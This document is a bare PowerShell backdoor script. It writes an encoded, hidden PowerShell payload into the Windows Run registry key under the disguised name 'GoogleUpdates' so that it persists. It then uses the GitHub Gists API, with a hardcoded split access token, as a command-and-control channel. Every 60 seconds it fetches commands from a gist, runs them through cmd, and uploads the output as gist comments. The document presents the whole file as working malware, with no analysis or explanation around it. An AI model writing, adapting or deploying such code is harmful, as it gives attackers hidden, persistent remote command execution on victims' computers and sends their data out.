$value ="C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noexit -nop -enc 'JABnAGkAcwB0AHMAVQBzAGUAcgA9ACIAdABlAGQAbQBpAGwAbABlAHIAZABhAHkAIgA7ACQAdAAxAD0AIgA4ADkANgBhADAAIgA7ACQAYwBoAGUAYwBrAFQAaQBtAGUAPQA2ADAAOwAkAHQAMgA9ACIAMwBkADYAYgAwADkANwA0AGUAZgA2ADQANwBhAGUAOQA0AGYANgAzACIAOwAkAHQAMwA9ACIANgAyADYAMwAwADYANAA2ADQAOABkAGEAZQBiADAAIgA7ACQAZwBpAHMAdABzAEEAcABpAFQAbwBrAGUAbgA9ACQAdAAxACsAJAB0ADIAKwAkAHQAMwA7ACQAbgBhAG0AZQAgAD0AIAAiAEcAbwBvAGcAbABlAFUAcABkAGEAdABlAHMAIgA7AGYAdQBuAGMAdABpAG8AbgAgAHMAZQBuAGQAUgBlAHMAdQBsAHQAKAAkAHIAKQB7ACAAdAByAHkAewAgAEEAZABkAC0AVAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFcAZQBiADsAIAAkAGUAPQBbAFMAeQBzAHQAZQBtAC4AVwBlAGIALgBIAHQAdABwAFUAdABpAGwAaQB0AHkAXQA6ADoAVQByAGwARQBuAGMAbwBkAGUAKABbAHMAeQBzAHQAZQBtAC4AUwB0AHIAaQBuAGcAXQA6ADoASgBvAGkAbgAoACIAYAByAGAAbgAiACwAJAByACkAKQA7ACAAJAB3AC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAIgB1AHMAZQByAC0AYQBnAGUAbgB0ACIALAAgACIATQBvAHoAaQBsAGwAYQAvADQALgAwACAAKABjAG8AbQBwAGEAdABpAGIAbABlADsAIABNAFMASQBFACAANgAuADAAOwAgAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA1AC4AMgA7ACAALgBOAEUAVAAgAEMATABSACAAMQAuADAALgAzADcAMAA1ADsAKQAiACkAOwAgACQAcgA9ACQAdwAuAFUAcABsAG8AYQBkAFMAdAByAGkAbgBnACgAJABjAG0AZABHAGkAcwB0AC4AYwBvAG0AbQBlAG4AdABzAF8AdQByAGwALAAiAHsAIgAiAGIAbwBkAHkAIgAiADoAIgAiACQAZQAiACIAfQAiACkAOwAgAH0AYwBhAHQAYwBoAHsAJABlAD0AWwBTAHkAcwB0AGUAbQAuAFcAZQBiAC4ASAB0AHQAcABVAHQAaQBsAGkAdAB5AF0AOgA6AFUAcgBsAEUAbgBjAG8AZABlACgAWwBzAHkAcwB0AGUAbQAuAFMAdAByAGkAbgBnAF0AOgA6AEoAbwBpAG4AKAAiAGAAcgBgAG4AIgAsACQAXwApACkAOwAkAHcALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAHUAcwBlAHIALQBhAGcAZQBuAHQAIgAsACAAIgBNAG8AegBpAGwAbABhAC8ANAAuADAAIAAoAGMAbwBtAHAAYQB0AGkAYgBsAGUAOwAgAE0AUwBJAEUAIAA2AC4AMAA7ACAAVwBpAG4AZABvAHcAcwAgAE4AVAAgADUALgAyADsAIAAuAE4ARQBUACAAQwBMAFIAIAAxAC4AMAAuADMANwAwADUAOwApACIAKQA7ACQAcgA9ACQAdwAuAFUAcABsAG8AYQBkAFMAdAByAGkAbgBnACgAJABjAG0AZABHAGkAcwB0AC4AYwBvAG0AbQBlAG4AdABzAF8AdQByAGwALAAiAHsAIgAiAGIAbwBkAHkAIgAiADoAIgAiACQAZQAiACIAfQAiACkAOwAgAH0AIAB9AGYAdQBuAGMAdABpAG8AbgAgAHAAYQByAHMAZQBDAG8AbQBtAGEAbgBkACgAJABjACkAewAgACQAagBDAD0AIgB7ACIAKwAkAGMAbwBtAG0AYQBuAGQAKwAiAH0AIgA7ACAAdAByAHkAewAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAVwBpAHQAaABQAGEAcgB0AGkAYQBsAE4AYQBtAGUAKAAiAFMAeQBzAHQAZQBtAC4AVwBlAGIALgBFAHgAdABlAG4AcwBpAG8AbgBzACIAKQA7ACQAcwBlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVwBlAGIALgBTAGMAcgBpAHAAdAAuAFMAZQByAGkAYQBsAGkAegBhAHQAaQBvAG4ALgBKAGEAdgBhAFMAYwByAGkAcAB0AFMAZQByAGkAYQBsAGkAegBlAHIAOwAkAGoAIAA9ACAAJABzAGUAcgAuAEQAZQBzAGUAcgBpAGEAbABpAHoAZQBPAGIAagBlAGMAdAAoACQAagBDACkAOwAgAH0AYwBhAHQAYwBoAHsAcwBlAG4AZABSAGUAcwB1AGwAdAAoACIARQBSAFIATwBSADoAIAAkAF8AIgApADsAIAB9ACAAaQBmACgAJABqACAALQBhAG4AZAAgACQAagAuAEMAbwBtAG0AYQBuAGQALgBsAGUAbgBnAHQAaAAgAC0AZwB0ACAAMAApAHsAIAAkAGMAbwBtAG0AYQBuAGQAUwB0AHIAPQAkAGoALgBDAG8AbQBtAGEAbgBkADsAIABpAGYAKAAkAGMAbwBtAG0AYQBuAGQAUwB0AHIAKQB7ACAAJAByAGUAcwB1AGwAdAAgAD0AIABjAG0AZAAgAC8AYwAgACgAJABjAG8AbQBtAGEAbgBkAFMAdAByACsAIgAgADIAPgAmADEAIgApADsAIABzAGUAbgBkAFIAZQBzAHUAbAB0ACgAIgBDAG8AbQBtAGEAbgBkACAAUgBlAHMAdQBsAHQAIABmAG8AcgAgACQAYwBvAG0AbQBhAG4AZABTAHQAcgAgADoAYAByAGAAbgAiACsAJAByAGUAcwB1AGwAdAApADsAIAB9ACAAfQAgAGkAZgAoACQAagAgAC0AYQBuAGQAIAAkAGoALgBSAGUAYQBkAEYAaQBsAGUALgBsAGUAbgBnAHQAaAAgAC0AZwB0ACAAMAApAHsAIAB9ACAAaQBmACgAJABqACAALQBhAG4AZAAgACQAagAuAFcAcgBpAHQAZQBGAGkAbABlAC4AbABlAG4AZwB0AGgALQBnAHQAIAAwACkAewAgAH0AIABpAGYAKAAkAGoAIAAtAGEAbgBkACAAJABqAC4AUABvAHcAZQByAHMAaABlAGwAbAAuAGwAZQBuAGcAdABoACAALQBnAHQAIAAwACkAewAgAH0AfQAkAG8AbABkAEMAbwBtAG0AYQBuAGQAPQAiACIAOwAkAHcAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB1AHAAYQBzAHMAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAQgB5AHQAZQBzACgAIgAkAHsAZwBpAHMAdABzAFUAcwBlAHIAfQA6ACQAewBnAGkAcwB0AHMAQQBwAGkAVABvAGsAZQBuAH0AIgApADsAJABhAHUAdABoAEgAZQBhAGQAZQByAD0AIgBCAGEAcwBpAGMAIAAiACsAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJAB1AHAAYQBzAHMAKQA7ACQAdwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgAiACwAJABhAHUAdABoAEgAZQBhAGQAZQByACkAOwAkAHcALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAHUAcwBlAHIALQBhAGcAZQBuAHQAIgAsACAAIgBNAG8AegBpAGwAbABhAC8ANAAuADAAIAAoAGMAbwBtAHAAYQB0AGkAYgBsAGUAOwAgAE0AUwBJAEUAIAA2AC4AMAA7ACAAVwBpAG4AZABvAHcAcwAgAE4AVAAgADUALgAyADsAIAAuAE4ARQBUACAAQwBMAFIAIAAxAC4AMAAuADMANwAwADUAOwApACIAKQA7AHcAaABpAGwAZQAoADEAKQB7ACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANgAwADsAIAAkAHcALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAiAHUAcwBlAHIALQBhAGcAZQBuAHQAIgAsACAAIgBNAG8AegBpAGwAbABhAC8ANAAuADAAIAAoAGMAbwBtAHAAYQB0AGkAYgBsAGUAOwAgAE0AUwBJAEUAIAA2AC4AMAA7ACAAVwBpAG4AZABvAHcAcwAgAE4AVAAgADUALgAyADsAIAAuAE4ARQBUAEMATABSACAAMQAuADAALgAzADcAMAA1ADsAKQAiACkAOwAgACQAZwBpAHMAdABzAD0AJAB3AC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AYQBwAGkALgBnAGkAdABoAHUAYgAuAGMAbwBtAC8AZwBpAHMAdABzACcAKQA7ACAAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZABXAGkAdABoAFAAYQByAHQAaQBhAGwATgBhAG0AZQAoACIAUwB5AHMAdABlAG0ALgBXAGUAYgAuAEUAeAB0AGUAbgBzAGkAbwBuAHMAIgApADsAIAAkAHMAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAFcAZQBiAC4AUwBjAHIAaQBwAHQALgBTAGUAcgBpAGEAbABpAHoAYQB0AGkAbwBuAC4ASgBhAHYAYQBTAGMAcgBpAHAAdABTAGUAcgBpAGEAbABpAHoAZQByADsAIAAkAGoAcwBvAG4ARwBpAHMAdABzACAAPQAgACQAcwBlAHIALgBEAGUAcwBlAHIAaQBhAGwAaQB6AGUATwBiAGoAZQBjAHQAKAAkAGcAaQBzAHQAcwApADsAIAAkAGMAbQBkAEkAZAA9ACIAIgA7ACAAJABjAG0AZABHAGkAcwB0AD0AewB9ADsAIABmAG8AcgBlAGEAYwBoACAAKAAkAG8AbgBlAEcAaQBzAHQAIABpAG4AIAAkAGoAcwBvAG4ARwBpAHMAdABzACkAewAgAGkAZgAoACgAJABvAG4AZQBHAGkAcwB0AFsAIgBmAGkAbABlAHMAIgBdAC4AYwBtAGQAIAApACAALQBhAG4AZAAgACgAJABvAG4AZQBHAGkAcwB0AFsAIgBmAGkAbABlAHMAIgBdAC4AYwBtAGQALgBmAGkAbABlAG4AYQBtAGUAIAAtAGUAcQAgACIAYwBtAGQAIgApACkAewAgACQAYwBtAGQASQBkAD0AJABvAG4AZQBHAGkAcwB0AC4AaQBkADsAIAAkAGMAbQBkAEcAaQBzAHQAPQAkAG8AbgBlAEcAaQBzAHQAOwAgAGIAcgBlAGEAawA7ACAAfQAgAH0AIAAkAGMAPQAiACIAOwAgAGkAZgAoACgAJABjAG0AZABJAGQALgBsAGUAbgBnAHQAaAAgAC0AZwB0ADAAKQAgAC0AYQBuAGQAKAAkAGMAbQBkAEcAaQBzAHQALgB1AHIAbAAuAGwAZQBuAGcAdABoACAALQBnAHQAIAAwACkAKQB7ACAAJAB3AC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAIgB1AHMAZQByAC0AYQBnAGUAbgB0ACIALAAgACIATQBvAHoAaQBsAGwAYQAvADQALgAwACAAKABjAG8AbQBwAGEAdABpAGIAbABlADsAIABNAFMASQBFACAANgAuADAAOwAgAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA1AC4AMgA7ACAALgBOAEUAVABDAEwAUgAgADEALgAwAC4AMwA3ADAANQA7ACkAIgApADsAIAAkAGMAbQBkAEcAaQBzAHQAQwBvAG4AdABlAG4AdAA9ACQAdwAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAYwBtAGQARwBpAHMAdAAuAHUAcgBsACkAOwAgAFsAUwB5AHMAdABlAG0ALgBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAVwBpAHQAaABQAGEAcgB0AGkAYQBsAE4AYQBtAGUAKAAiAFMAeQBzAHQAZQBtAC4AVwBlAGIALgBFAHgAdABlAG4AcwBpAG8AbgBzACIAKQA7ACAAJABzAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBXAGUAYgAuAFMAYwByAGkAcAB0AC4AUwBlAHIAaQBhAGwAaQB6AGEAdABpAG8AbgAuAEoAYQB2AGEAUwBjAHIAaQBwAHQAUwBlAHIAaQBhAGwAaQB6AGUAcgA7ACAAJABjAG0AZABHAGkAcwB0AEQAZQB0AGEAaQBsACAAPQAgACQAcwBlAHIALgBEAGUAcwBlAHIAaQBhAGwAaQB6AGUATwBiAGoAZQBjAHQAKAAkAGMAbQBkAEcAaQBzAHQAQwBvAG4AdABlAG4AdAApADsAIAAkAGMAPQAkAGMAbQBkAEcAaQBzAHQARABlAHQAYQBpAGwAWwAiAGYAaQBsAGUAcwAiAF0ALgBjAG0AZAAuAGMAbwBuAHQAZQBuAHQAOwAgAH0AIABpAGYAKAAkAGMAIAAtAGEAbgBkACAAKAAkAGMAIAAtAG4AZQAgACQAbwBsAGQAQwBvAG0AbQBhAG4AZAApACkAewAgACQAYwBvAG0AbQBhAG4AZABMAGkAcwB0AD0AJABjAC4AcwBwAGwAaQB0ACgAIgBgAG4AIgApADsAIABmAG8AcgBlAGEAYwBoACAAKAAkAG8AbgBlAEMAbwBtAG0AYQBuAGQAIABpAG4AIAAkAGMAbwBtAG0AYQBuAGQATABpAHMAdAApAHsAIABwAGEAcgBzAGUAQwBvAG0AbQBhAG4AZAAoACQAbwBuAGUAQwBvAG0AbQBhAG4AZAApADsAIAB9ACAAJABvAGwAZABDAG8AbQBtAGEAbgBkAD0AJABjADsAIAB9AH0A
'"
try{
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -PropertyType String -Value $value -ErrorAction Stop
    $tip = "Success:"+$name;
}catch [System.Exception]{
}finally{
}
$gistsUser="tedmillerday";$t1="896a0";$checkTime=60;$t2="3d6b0974ef647ae94f63";$t3="6263064648daeb0";$gistsApiToken=$t1+$t2+$t3;$name = "GoogleUpdates";function sendResult($r){ try{ Add-Type -AssemblyName System.Web; $e=[System.Web.HttpUtility]::UrlEncode([system.String]::Join("`r`n",$r)); $w.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)"); $r=$w.UploadString($cmdGist.comments_url,"{""body"":""$e""}"); }catch{$e=[System.Web.HttpUtility]::UrlEncode([system.String]::Join("`r`n",$_));$w.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");$r=$w.UploadString($cmdGist.comments_url,"{""body"":""$e""}"); } }function parseCommand($c){ $jC="{"+$command+"}"; try{ [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions");$ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer;$j = $ser.DeserializeObject($jC); }catch{sendResult("ERROR: $_"); } if($j -and $j.Command.length -gt 0){ $commandStr=$j.Command; if($commandStr){ $result = cmd /c ($commandStr+" 2>&1"); sendResult("Command Result for $commandStr :`r`n"+$result); } } if($j -and $j.ReadFile.length -gt 0){ } if($j -and $j.WriteFile.length-gt 0){ } if($j -and $j.Powershell.length -gt 0){ }}$oldCommand="";$w=new-object System.Net.WebClient;$upass=[System.Text.Encoding]::UTF8.GetBytes("${gistsUser}:${gistsApiToken}");$authHeader="Basic "+[System.Convert]::ToBase64String($upass);$w.Headers.Add("Authorization",$authHeader);$w.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");while(1){ Start-Sleep -Seconds 60; $w.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NETCLR 1.0.3705;)"); $gists=$w.DownloadString('https://api.github.com/gists'); [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions"); $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer; $jsonGists = $ser.DeserializeObject($gists); $cmdId=""; $cmdGist={}; foreach ($oneGist in $jsonGists){ if(($oneGist["files"].cmd ) -and ($oneGist["files"].cmd.filename -eq "cmd")){ $cmdId=$oneGist.id; $cmdGist=$oneGist; break; } } $c=""; if(($cmdId.length -gt0) -and($cmdGist.url.length -gt 0)){ $w.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NETCLR 1.0.3705;)"); $cmdGistContent=$w.DownloadString($cmdGist.url); [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions"); $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer; $cmdGistDetail = $ser.DeserializeObject($cmdGistContent); $c=$cmdGistDetail["files"].cmd.content; } if($c -and ($c -ne $oldCommand)){ $commandList=$c.split("`n"); foreach ($oneCommand in $commandList){ parseCommand($oneCommand); } $oldCommand=$c; }}
